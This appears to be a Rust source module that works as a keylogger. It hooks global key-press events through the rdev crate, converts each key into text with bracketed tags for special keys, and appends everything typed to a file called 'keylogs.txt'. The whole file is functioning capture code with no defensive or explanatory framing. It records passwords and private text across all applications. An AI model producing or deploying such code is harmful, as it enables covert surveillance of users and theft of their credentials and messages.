use rdev::{listen, Event, EventType, Key};
use std::{fs::OpenOptions, io::Write};

pub fn recording() {
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error);
    }
}

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let mut file = OpenOptions::new()
            .read(true)
            .write(true)
            .append(true)
            .create(true)
            .open("keylogs.txt")
            .unwrap();
        if let Some(key_char) = key_to_string(key) {
            file.write_all(key_char.as_bytes()).unwrap();
        }
    }
}

fn key_to_string(key: Key) -> Option<String> {
    let key_str = format!("{:?}", key);

    let cleaned_key = key_str.strip_prefix("Key").unwrap_or(&key_str).to_string();

    let final_str = match key {
        Key::Return => "\n".to_string(),
        Key::Space => " ".to_string(),
        Key::Backspace => "[BACK]".to_string(),
        Key::Escape => "[ESC]".to_string(),
        Key::ControlLeft | Key::ControlRight => "[CTRL]".to_string(),
        Key::ShiftLeft | Key::ShiftRight => "[SHIFT]".to_string(),
        Key::Alt => "[ALT]".to_string(),
        Key::Tab => "[TAB]".to_string(),
        _ => cleaned_key,
    };

    Some(final_str)
}
